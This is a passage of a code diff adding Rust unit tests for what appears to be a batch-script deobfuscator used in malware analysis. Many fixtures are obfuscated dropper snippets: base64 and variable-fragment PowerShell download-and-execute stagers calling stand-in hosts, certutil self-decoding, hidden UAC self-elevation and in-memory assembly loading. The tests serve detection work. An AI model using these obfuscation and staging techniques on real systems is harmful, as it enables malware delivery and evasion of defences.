@@ -933,6 +1778,130 @@ mod analyze_tests {
     }
 
     #[test]
+    fn polyglot_script_block_respects_child_script_cap() {
+        let mut env = Environment::new(&Config {
+            max_child_scripts: 1,
+            ..Config::default()
+        });
+        super::pre_scan_polyglot_script_block(
+            br#"<script language="JScript">alert(1)</script>
+<script language="JScript">alert(2)</script>"#,
+            &mut env,
+        );
+
+        assert_eq!(
+            env.all_extracted_jscript.len(),
+            1,
+            "polyglot pre-scan should stop queueing at the child-script cap: {:?}",
+            env.all_extracted_jscript
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::ChildScriptsCapped)),
+            "expected ChildScriptsCapped trait: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn batch_js_comment_polyglot_queues_jscript_without_omission_summaries() {
+        let text = concat!(
+            "/* marker\r\n",
+            "set markerKey=v\r\n",
+            "*/ //marker\r\n",
+            "var marker = [];\r\n",
+            "this['WScript'].CreateObject('WScript.Shell');\r\n",
+            "rem omitted multiline base64 PE carrier (10 lines, 100 bytes)\r\n",
+        );
+        let mut env = Environment::new(&Config::default());
+
+        super::pre_scan_batch_js_comment_polyglot(text, &mut env);
+
+        assert_eq!(
+            env.all_extracted_jscript.len(),
+            1,
+            "batch/JScript comment polyglot was not queued: {:?}",
+            env.all_extracted_jscript
+        );
+        let extracted = String::from_utf8_lossy(&env.all_extracted_jscript[0]);
+        assert!(
+            extracted.contains("var marker = []")
+                && extracted.contains("this['WScript'].CreateObject"),
+            "queued JScript payload is missing expected JS:\n{}",
+            extracted
+        );
+        assert!(
+            !extracted.contains("rem omitted"),
+            "tool omission summary leaked into extracted JScript:\n{}",
+            extracted
+        );
+    }
+
+    #[test]
+    fn call_set_powershell_staging_does_not_consume_child_script_budget() {
+        let script = br#"@echo off
+setlocal enabledelayedexpansion
+call set "PSCMD=powershell -Command "function Stage"
+call set "PSCMD=!PSCMD! { [Reflection.Assembly]::Load($bytes)"
+call set "PSCMD=!PSCMD! ; Invoke-WebRequest -Uri https://staged.example/p.ps1"
+call set "PSCMD=!PSCMD! }"
+"%PSCMD%"
+"#;
+        let report = analyze(
+            script,
+            &Config {
+                max_child_scripts: 2,
+                ..Config::default()
+            },
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::ChildScriptsCapped)),
+            "call set staging should not be treated as child scripts: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn inline_if_set_staging_does_not_consume_child_script_budget() {
+        let script = br#"@echo off
+set _1=IF
+set _2=SET
+%_1% 1==1 (%_2% _5=po) else (%_2% _5=x1)
+%_1% 2==2 (%_2% _6=we) else (%_2% _6=x2)
+%_1% 3==3 (%_2% _7=rs) else (%_2% _7=x3)
+%_1% 4==4 (%_2% _8=he) else (%_2% _8=x4)
+%_1% 5==5 (%_2% _9=ll) else (%_2% _9=x5)
+%_1% 6==6 (%_2% _10=Write-Host staged) else (%_2% _10=x6)
+%_5%%_6%%_7%%_8%%_9% -c "%_10%"
+"#;
+        let report = analyze(
+            script,
+            &Config {
+                max_child_scripts: 2,
+                ..Config::default()
+            },
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::ChildScriptsCapped)),
+            "inline IF/SET staging should not be treated as child scripts: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("powershell -c"),
+            "staged variables were not materialized:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn polyglot_explicit_jscript_tag_wins_over_wscript_heuristic() {
         let mut env = Environment::new(&Config::default());
         super::pre_scan_polyglot_script_block(
@@ -974,6 +1943,30 @@ CreateObject("WScript.Shell").Run pdf, 0, True
     }
 
     #[test]
+    fn utf16_private_function_vbs_blob_is_not_duplicated_as_jscript() {
+        let mut env = Environment::new(&Config::default());
+        let decoded = "\u{feff}private function CreateSession(wsman, conStr, optDic, luar)\r\n\
+            dim afamador\r\n\
+            set afamador = wsman.CreateSession(conStr)\r\n\
+            CreateSession = afamador\r\n\
+            end function\r\n";
+
+        super::pre_scan_utf16_script_blob(decoded, &mut env);
+
+        assert_eq!(
+            env.all_extracted_vbs.len(),
+            1,
+            "decoded VBScript blob should queue as VBS: {:?}",
+            env.all_extracted_vbs
+        );
+        assert!(
+            env.all_extracted_jscript.is_empty(),
+            "decoded VBScript blob should not also queue as JScript: {:?}",
+            env.all_extracted_jscript
+        );
+    }
+
+    #[test]
     fn batch_wsf_polyglot_vbscript_block_queues_vbs_payload() {
         let mut env = Environment::new(&Config::default());
         super::pre_scan_polyglot_script_block(
@@ -998,6 +1991,48 @@ CreateObject("WScript.Shell").Run pdf, 0, True
             "WSF VBScript block not queued as VBS: js={:?} vbs={:?}",
             env.all_extracted_jscript,
             env.all_extracted_vbs
+        );
+    }
+
+    #[test]
+    fn echoed_vbs_run_expands_adjacent_repeated_bang_fragments() {
+        let script = br#"@echo off
+setlocal EnableDelayedExpansion
+set "dlcmd_0_alpha=power"
+set "dlcmd_1_beta=shell "
+set "dlcmd_2_gamma=-Command "
+set "dlcmd_3_delta=Invoke-WebRequest https://vbs-delayed-bang.example/stage.ps1"
+>"%TEMP%\run.vbs" echo Set w=CreateObject("WScript.Shell")
+>>"%TEMP%\run.vbs" echo w.Run "!!dlcmd_0_alpha!!dlcmd_1_beta!!dlcmd_2_gamma!!dlcmd_3_delta!!", 0, False
+cscript //nologo "%TEMP%\run.vbs"
+"#;
+
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.deobfuscated.contains(
+                "powershell -Command Invoke-WebRequest https://vbs-delayed-bang.example/stage.ps1"
+            ),
+            "VBS Run command was not reconstructed:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report
+                .deobfuscated
+                .lines()
+                .any(|line| line.contains("w.Run") && line.contains("dlcmd_")),
+            "fragment variable leaked into reconstructed command:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://vbs-delayed-bang.example/stage.ps1"
+            )),
+            "download from reconstructed VBS PowerShell was not extracted: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
         );
     }
 
@@ -1088,6 +2123,140 @@ CreateObject("WScript.Shell").Run pdf, 0, True
                 .iter()
                 .any(|ps| ps.contains("xcopy-copied-ps.example/stage")),
             "xcopy copied powershell alias body was not extracted as ps1: {:?}",
+            report.extracted_ps1_normalized
+        );
+    }
+
+    #[test]
+    fn echo_piped_bare_powershell_extracts_env_backed_base64_payload() {
+        use base64::Engine;
+
+        let payload = "Invoke-WebRequest -Uri https://env-pipe-ps.example/stage";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
+        let script = format!(
+            "set \"Blob={b64}\"\r\n\
+             echo iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($env:Blob))) | powershell.exe -W H -NOp -EP Bypass\r\n",
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("env-pipe-ps.example/stage")),
+            "env-backed piped PowerShell payload was not extracted: {:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } if src == "https://env-pipe-ps.example/stage"
+                )
+            }),
+            "env-backed piped PowerShell URL was not scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn echo_piped_bare_powershell_expands_batch_variable_payload() {
+        let payload = r#"iex("(New-Object Net.WebClient).DownloadString('https://batch-pipe-ps.example/stage')");"#;
+        let script = format!(
+            "set \"Stage={payload}\"\r\n\
+             set \"Runner=cmd.exe /c powershell.exe -exec bypass -nop -win 1 -\"\r\n\
+             echo %%Stage%% | %Runner%\r\n",
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("batch-pipe-ps.example/stage")),
+            "batch-variable piped PowerShell payload was not extracted: {:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            !report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("%Stage%")),
+            "unexpanded batch variable leaked into extracted PowerShell payloads: {:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } if src == "https://batch-pipe-ps.example/stage"
+                )
+            }),
+            "batch-variable piped PowerShell URL was not scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn unresolved_self_substitution_set_does_not_seed_fake_literal_url() {
+        let script = br#"@echo off
+for /f "delims=" %%a in ('find "https://download" "%temp%\weba.html" ^| find /i ".rar"') do set "result=%%a"
+set "result=%result:"=%"
+set "result=%result:*https://download=https://download%"
+for /f "tokens=1* delims= " %%a in ("%result%") do set result=%%a
+set "result=%result: =%"
+set url=%result%
+powershell -Command "& { $request = [System.Net.WebRequest]::Create('%url%') }"
+"#;
+
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            !report.deobfuscated.contains("set url=result:\"=")
+                && !report
+                    .deobfuscated
+                    .contains("[System.Net.WebRequest]::Create('result:\"=')"),
+            "unresolved self-substitution was seeded as a fake concrete value:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        | Trait::DownloadInDeobText { src, .. }
+                        | Trait::UrlVariable { url: src, .. }
+                        if src == "result:\"="
+                )
+            }),
+            "fake result literal was emitted as a URL trait: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn echo_piped_powershell_resolves_raw_seeded_goto_skipped_carrier() {
+        use base64::Engine;
+
+        let payload = "Invoke-WebRequest -Uri https://goto-env-pipe.example/stage; ".repeat(8);
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
+        let script = format!(
+            "goto run\r\n\
+             set \"Blob={b64}\"\r\n\
+             :run\r\n\
+             echo iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($env:Blob))) | powershell.exe -W H -NOp -EP Bypass\r\n",
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("goto-env-pipe.example/stage")),
+            "goto-skipped env carrier was not extracted: {:?}",
             report.extracted_ps1_normalized
         );
     }
@@ -1192,6 +2361,32 @@ for /f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#,
     }
 
     #[test]
+    fn echo_redirect_trait_content_respects_output_cap() {
+        let mut env = Environment::new(&Config {
+            max_output_bytes: 8,
+            ..Config::default()
+        });
+        interpret_line(&format!(r#">out.txt echo {}"#, "A".repeat(100)), &mut env);
+
+        let content_len = env
+            .traits
+            .iter()
+            .find_map(|t| match t {
+                Trait::EchoRedirect { content, .. } => Some(content.len()),
+                _ => None,
+            })
+            .expect("EchoRedirect trait");
+        assert_eq!(content_len, 8);
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, crate::traits::Trait::OutputCapped { .. })),
+            "expected OutputCapped trait: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn echo_inline_redirect_without_space_records_content() {
         let mut env = Environment::new(&Config::default());
         interpret_line("echo SGVsbG8=>payload.b64", &mut env);
@@ -1206,6 +2401,40 @@ for /f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#,
     }
 
     #[test]
+    fn echo_redirect_preserves_literal_caret_from_doubled_caret() {
+        let report = analyze(
+            br#"echo dec_code = "".join([chr(b ^^ key) for b in enc_data])>> "%TEMP%\ldr.py""#,
+            &AnalyzeConfig::default(),
+        );
+
+        assert!(
+            report
+                .deobfuscated
+                .contains(r#"chr(b ^ key) for b in enc_data"#),
+            "deobf lost literal caret:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report
+                .deobfuscated
+                .contains(r#"chr(b  key) for b in enc_data"#),
+            "deobf should not collapse doubled caret to whitespace:\n{}",
+            report.deobfuscated
+        );
+        let echoed = report.traits.iter().find_map(|t| match t {
+            Trait::EchoRedirect { content, .. } => Some(String::from_utf8_lossy(content)),
+            _ => None,
+        });
+        assert!(
+            echoed
+                .as_deref()
+                .is_some_and(|content| content.contains(r#"chr(b ^ key) for b in enc_data"#)),
+            "EchoRedirect content lost literal caret: {:?}",
+            echoed
+        );
+    }
+
+    #[test]
     fn echo_single_quoted_redirect_target_records_content() {
         let mut env = Environment::new(&Config::default());
         interpret_line("echo hello > 'payload.txt'", &mut env);
@@ -1217,6 +2446,37 @@ for /f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#,
             FsEntry::Content { content, .. } => assert_eq!(content, b"hello\r\n"),
             other => panic!("not Content: {:?}", other),
         }
+    }
+
+    #[test]
+    fn echo_doubled_quoted_redirect_target_records_content_without_path_leak() {
+        let report = analyze(
+            br#"echo Set UAC = CreateObject(""Shell.Application"") > ""C:\Users\puncher\AppData\Local\Temp\getadmin.vbs"""#,
+            &AnalyzeConfig::default(),
+        );
+
+        let echoed = report
+            .traits
+            .iter()
+            .find_map(|trait_| match trait_ {
+                Trait::EchoRedirect {
+                    target,
+                    content,
+                    append,
+                } => Some((target.as_str(), String::from_utf8_lossy(content), *append)),
+                _ => None,
+            })
+            .expect("EchoRedirect trait");
+
+        assert_eq!(
+            echoed.0,
+            r#"C:\Users\puncher\AppData\Local\Temp\getadmin.vbs"#
+        );
+        assert_eq!(
+            echoed.1,
+            r#"Set UAC = CreateObject(""Shell.Application"")"#.to_string() + "\r\n"
+        );
+        assert!(!echoed.2);
     }
 
     #[test]
@@ -1474,6 +2734,64 @@ powershell -Command "& { (New-Object System.Net.WebClient).DownloadFile('%zipUrl
                 Trait::Download { src, .. } if src == "https://start.example/p.png")),
             "start URL not trimmed before closing paren: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn quoted_set_body_resolves_noisy_non_ascii_percent_substring_refs() {
+        let script = concat!(
+            "@set \"nv=abcdefghijklmnopqrstuvwxyz:/.\"\r\n",
+            "%☃nv:~18,1%%☃nv:~4,1%%☃nv:~19,1% ",
+            "\"%☃nv:~20,1%%☃nv:~17,1%%☃nv:~11,1%=",
+            "%☃nv:~7,1%%☃nv:~19,1%%☃nv:~19,1%%☃nv:~15,1%",
+            "%☃nv:~18,1%%☃nv:~26,1%%☃nv:~27,1%%☃nv:~27,1%",
+            "stage.example/p.zip\"\r\n",
+            "echo %url%\r\n"
+        );
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains(r#"set "url=https://stage.example/p.zip""#),
+            "quoted set body should resolve substring-built name/value:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("echo https://stage.example/p.zip"),
+            "subsequent percent lookup should see the recovered variable:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn quoted_set_body_preserves_utf8_percent_substring_variable_names() {
+        let script = concat!(
+            "@set \"Gé=abcdefghijklmnopqrstuvwxyz:/.\"\r\n",
+            "%Gé:~18,1%%Gé:~4,1%%Gé:~19,1% ",
+            "\"%Gé:~20,1%%Gé:~17,1%%Gé:~11,1%=",
+            "%Gé:~7,1%%Gé:~19,1%%Gé:~19,1%%Gé:~15,1%",
+            "%Gé:~18,1%%Gé:~26,1%%Gé:~27,1%%Gé:~27,1%",
+            "utf8-table.example/p.zip\"\r\n",
+            "echo %url%\r\n"
+        );
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains(r#"set "url=https://utf8-table.example/p.zip""#),
+            "quoted set body should preserve UTF-8 variable names:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("echo https://utf8-table.example/p.zip"),
+            "subsequent percent lookup should see the UTF-8 table expansion:\n{}",
+            report.deobfuscated
         );
     }
 
@@ -1755,6 +3073,69 @@ powershell -Command "& { (New-Object System.Net.WebClient).DownloadFile('%zipUrl
     }
 
     #[test]
+    fn certutil_decoded_batch_is_extracted_as_cmd_not_full_ps1() {
+        let inner = "@echo off\r\npowershell Invoke-RestMethod api.ipify.org\r\n";
+        let encoded = base64::engine::general_purpose::STANDARD.encode(inner.as_bytes());
+        let script = format!(
+            "@echo off\r\n\
+            certutil -f -decode \"%~f0\" \"%TEMP%\\0.bat\" >nul 2>&1\r\n\
+            call \"%TEMP%\\0.bat\"\r\n\
+            -----BEGIN CERTIFICATE----- {} -----END CERTIFICATE-----\r\n",
+            encoded
+        );
+
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+
+        assert!(
+            report.extracted_cmd.iter().any(|payload| payload == inner),
+            "decoded batch body should be saved as extracted cmd: {:?}",
+            report.extracted_cmd
+        );
+        assert!(
+            !report
+                .extracted_ps1
+                .iter()
+                .any(|payload| payload.as_slice() == inner.as_bytes()),
+            "full decoded batch body should not be saved as ps1: {:?}",
+            report.extracted_ps1
+        );
+        assert!(
+            report.extracted_ps1.iter().any(|payload| {
+                String::from_utf8_lossy(payload).contains("Invoke-RestMethod api.ipify.org")
+            }),
+            "embedded PowerShell invocation should still be saved: {:?}",
+            report.extracted_ps1
+        );
+    }
+
+    #[test]
+    fn certutil_decoded_vbs_is_not_extracted_as_cmd() {
+        let vbs = "set WshShell = wscript.createobject(\"WScript.shell\")\r\n";
+        let encoded = base64::engine::general_purpose::STANDARD.encode(vbs.as_bytes());
+        let script = format!(
+            "echo {encoded}>src.b64\r\n\
+             certutil -decode src.b64 stage.vbs\r\n\
+             wscript stage.vbs\r\n"
+        );
+
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+
+        assert!(
+            report
+                .extracted_vbs
+                .iter()
+                .any(|payload| payload.as_slice() == vbs.as_bytes()),
+            "decoded VBS should be saved as vbs: {:?}",
+            report.extracted_vbs
+        );
+        assert!(
+            !report.extracted_cmd.iter().any(|payload| payload == vbs),
+            "decoded VBS should not be saved as cmd: {:?}",
+            report.extracted_cmd
+        );
+    }
+
+    #[test]
     fn certutil_decode_reuses_destination_path_across_nested_layers() {
         // Real-world dropper chains often write every stage to the same
         // temp destination (`%TEMP%\0.bat`). We still need to recurse when
@@ -1845,6 +3226,45 @@ powershell -Command "& { (New-Object System.Net.WebClient).DownloadFile('%zipUrl
     }
 
     #[test]
+    fn powershell_frombase64_command_line_is_summarized_in_parent_deob() {
+        use base64::Engine;
+
+        let body = "Invoke-WebRequest -Uri https://frombase64-summary.example/p";
+        let encoded = base64::engine::general_purpose::STANDARD.encode(body.as_bytes());
+        let script = format!(
+            "@echo off\r\npowershell -NoProfile -ExecutionPolicy Bypass -Command \"$de = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded}')); Invoke-Expression $de\"\r\n"
+        );
+
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted PS FromBase64String command line"),
+            "FromBase64String wrapper was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&encoded),
+            "raw base64 leaked into parent deob:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("frombase64-summary.example"),
+            "decoded payload polluted parent deob:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|payload| payload.contains("frombase64-summary.example")),
+            "decoded payload missing from extracted buffers: {:?}",
+            report.extracted_ps1_normalized
+        );
+    }
+
+    #[test]
     fn call_script_extension_pushes_implicit_host_trait() {
         // `call X.jS` shellexecutes via wscript (PathExt resolution).
         // batdeob's call handler re-feeds via interpret_line, which
@@ -1879,6 +3299,20 @@ powershell -Command "& { (New-Object System.Net.WebClient).DownloadFile('%zipUrl
                     if src.eq_ignore_ascii_case("C:\\Temp\\foo.vbs")
             )),
             "WscriptExec trait not pushed for quoted script path: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn malformed_url_fragment_script_extension_does_not_push_implicit_host_trait() {
+        let mut env = Environment::new(&Config::default());
+        crate::interp::interpret_line(r#""=://example.test/PWS.vbs""#, &mut env);
+
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, crate::traits::Trait::WscriptExec { .. })),
+            "malformed URL fragment should not become WscriptExec: {:?}",
             env.traits
         );
     }
@@ -3241,6 +4675,26 @@ move "C:\Users\puncher\Downloads\startupppp.bat" "%APPDATA%\Microsoft\Windows\St
                 Trait::InMemoryAssemblyLoad { variant } if variant == "AppDomain.Load"
             )),
             "AppDomain InMemoryAssemblyLoad not detected: traits={:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn thread_getdomain_inmem_assembly_load_detected_in_extracted_ps_payload() {
+        let body =
+            "$payload=[byte[]](77,90,0,0); [System.Threading.Thread]::GetDomain().Load($payload)";
+        use base64::Engine as _;
+        let enc = base64::engine::general_purpose::STANDARD.encode(body.as_bytes());
+        let script = format!(
+            "@echo off\r\npowershell -Command \"$y=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{enc}')); iex $y\"\r\n"
+        );
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::InMemoryAssemblyLoad { variant } if variant == "AppDomain.Load"
+            )),
+            "Thread.GetDomain InMemoryAssemblyLoad not detected: traits={:?}",
             report.traits
         );
     }
@@ -5484,6 +6938,22 @@ mod snapshot_tests {
     use crate::Environment;
 
     #[test]
+    fn snapshot_get_uses_configured_windows_version() {
+        assert_eq!(
+            crate::snapshot::get(WinVer::Win7).and_then(|snap| snap.source_build.as_deref()),
+            Some("7601")
+        );
+        assert_eq!(
+            crate::snapshot::get(WinVer::Win10).and_then(|snap| snap.source_build.as_deref()),
+            Some("19045")
+        );
+        assert_eq!(
+            crate::snapshot::get(WinVer::Win11).and_then(|snap| snap.source_build.as_deref()),
+            Some("26200")
+        );
+    }
+
+    #[test]
     fn win11_snapshot_has_more_assoc_than_fallback() {
         let mut env = Environment::new(&Config {
             winver: WinVer::Win11,
@@ -5499,14 +6969,7 @@ mod snapshot_tests {
     }
 
     #[test]
-    fn win10_falls_through_to_win11_snapshot() {
-        // Snapshot::get used to return None for Win7/Win10 and we'd
-        // fall through to a 20-entry hardcoded table in synth.rs. That
-        // table is missing `Microsoft.PowerShellConsole.1` etc. that
-        // the FE DOSfuscation FOR /F `ftype^|findstr lCo` gadget keys
-        // off, so we now fall through to the Win11 snapshot instead.
-        // The hardcoded fallback only fires when the Win11 JSON itself
-        // fails to load (never, in practice).
+    fn win10_snapshot_has_more_assoc_than_fallback() {
         let mut env = Environment::new(&Config {
             winver: WinVer::Win10,
             ..Config::default()
@@ -5514,7 +6977,7 @@ mod snapshot_tests {
         let lines = run_pipeline("assoc", &mut env);
         assert!(
             lines.len() > 100,
-            "expected Win11 fallthrough snapshot, got {} entries",
+            "expected Win10 snapshot, got {} entries",
             lines.len()
         );
         assert!(lines.iter().any(|l| l.starts_with(".bat=")));
@@ -5539,7 +7002,7 @@ mod snapshot_tests {
 #[cfg(test)]
 mod for_f_misc_tests {
     use crate::traits::Trait;
-    use crate::{analyze, Config};
+    use crate::{analyze, analyze_with_path, Config};
 
     #[test]
     fn for_f_tokens_trailing_comma() {
@@ -5912,6 +7375,69 @@ for /f "tokens=6 delims=, " %%A in (GEO.csv) do echo city=%%A>location.txt
             "downloaded ip-api CSV file source should resolve: {:?}",
             report.traits
         );
+    }
+
+    #[test]
+    fn powershell_download_trait_cmd_preserves_full_destination_context() {
+        let script = br#"set "exeFile=%TEMP%\setup.exe"
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://api.chimera-hosting.zip/87rh1c6/hhMcKYKgMFjLeS/VioletClient.exe', '%exeFile%')"
+"#;
+        let report = analyze(script, &Config::default());
+        let mut found = false;
+        for trait_item in &report.traits {
+            if let Trait::Download {
+                src,
+                dst: Some(dst),
+                cmd,
+            } = trait_item
+            {
+                if src == "https://api.chimera-hosting.zip/87rh1c6/hhMcKYKgMFjLeS/VioletClient.exe"
+                {
+                    found = true;
+                    assert!(
+                        cmd.contains(dst),
+                        "download cmd should include full resolved destination {dst:?}; got {cmd:?}"
+                    );
+                }
+            }
+        }
+        assert!(found, "download trait missing: {:?}", report.traits);
+    }
+
+    #[test]
+    fn self_elevation_args_resolve_batch_path_assignments_from_raw_script() {
+        let script = br#"set "originalPID="
+set "batchPath=%~f0"
+set "batchArgs=MINIMIZED KILLPARENT %originalPID%"
+powershell -noprofile -windowstyle hidden -command "Start-Process -WindowStyle Hidden -FilePath 'cmd.exe' -ArgumentList '/min /c \"\"%batchPath%\" %batchArgs%\"' -Verb RunAs"
+"#;
+        let report = analyze_with_path(
+            script,
+            &Config::default(),
+            r#"C:\Users\puncher\Downloads\vaaPyVi.bat"#,
+        );
+        let mut found = false;
+        for trait_item in &report.traits {
+            if let Trait::SelfElevation {
+                target,
+                args: Some(args),
+            } = trait_item
+            {
+                if target == "cmd.exe" {
+                    found = true;
+                    assert!(
+                        args.contains(r#"C:\Users\puncher\Downloads\vaaPyVi.bat"#)
+                            && args.contains("MINIMIZED KILLPARENT"),
+                        "self elevation args were not expanded: {args:?}"
+                    );
+                    assert!(
+                        !args.contains("%batchPath%") && !args.contains("%batchArgs%"),
+                        "unresolved wrapper vars remained: {args:?}"
+                    );
+                }
+            }
+        }
+        assert!(found, "self elevation args missing: {:?}", report.traits);
     }
 
     #[test]
@@ -7296,6 +8822,40 @@ mod ps_iwr_variants_tests {
     }
 
     #[test]
+    fn quoted_iwr_url_with_spaces_preserves_full_source() {
+        let script = br#"@echo off
+set "baseUrl=https://spaces.example"
+set "fileUrl=%baseUrl%/pdf/Electrical Appliances Inventory.pdf"
+set "fileDestination=%TEMP%\Electrical Appliances Inventory.pdf"
+powershell -Command "& { Invoke-WebRequest -Uri '%fileUrl%' -OutFile '%fileDestination%' }"
+"#;
+        let report = analyze(script, &Config::default());
+        let has_full = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://spaces.example/pdf/Electrical Appliances Inventory.pdf"
+                        && dst.as_deref()
+                            == Some("C:\\Users\\puncher\\AppData\\Local\\Temp\\Electrical Appliances Inventory.pdf")
+            )
+        });
+        assert!(
+            has_full,
+            "quoted URL with spaces was not preserved: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. }
+                        if src == "https://spaces.example/pdf/Electrical"
+                )
+            }),
+            "truncated URL trait should not be emitted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn multiple_iwr_commands_keep_their_own_outfile() {
         let ps = r#"IWR -Uri "http://x.example/a.pdf" -OutFile "$env:temp\a.pdf" ; IWR -Uri "http://x.example/b.exe" -OutFile "$env:temp\b.exe""#;
         let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
@@ -7741,6 +9301,89 @@ mod explicit_environment_tests {
     }
 
     #[test]
+    fn batch_environment_scriptblock_is_captured_before_variable_cleanup() {
+        let script = br#"set "_it=Invoke-WebRequest https://batch-env-stage.example/payload.exe -OutFile payload.exe"
+powershell -Command "&([scriptblock]::Create($env:_it))"
+set "_it="
+"#;
+
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                        if src == "https://batch-env-stage.example/payload.exe"
+                )
+            }),
+            "batch env-backed PowerShell stage was not captured before cleanup: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn batch_environment_scriptblock_payload_is_materialized_before_cleanup() {
+        let script = br#"set "_it=$marker = 'captured-before-cleanup'"
+powershell -Command "&([scriptblock]::Create($env:_it))"
+set "_it="
+"#;
+
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|payload| payload.contains("captured-before-cleanup")),
+            "batch-backed scriptblock payload was not materialized: {:?}",
+            report.extracted_ps1_normalized
+        );
+    }
+
+    #[test]
+    fn percent_preconsume_preserves_embedded_quotes_in_set_values() {
+        let script =
+            "set \"Tail=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -\"\r\n";
+        let mut env = crate::Environment::new(&Config::default());
+
+        super::preconsume_raw_simple_sets_before_percent_noise_summary(script, &mut env);
+
+        assert_eq!(
+            env.get("Tail").as_deref(),
+            Some("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -")
+        );
+    }
+
+    #[test]
+    fn env_scriptblock_inside_unresolved_else_branch_is_still_scanned() {
+        let script = br#"set "_it=Invoke-WebRequest https://unresolved-else-env-stage.example/payload.exe -OutFile payload.exe"
+if defined _MSI (
+  powershell -Command "Write-Output installer"
+) else (
+  start "" /b powershell -Command "&([scriptblock]::Create($env:_it))"
+)
+set "_it="
+"#;
+
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                        if src == "https://unresolved-else-env-stage.example/payload.exe"
+                )
+            }),
+            "env-backed PowerShell stage inside unresolved else branch was not scanned: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn digit_leading_powershell_environment_name_expands() {
         let script =
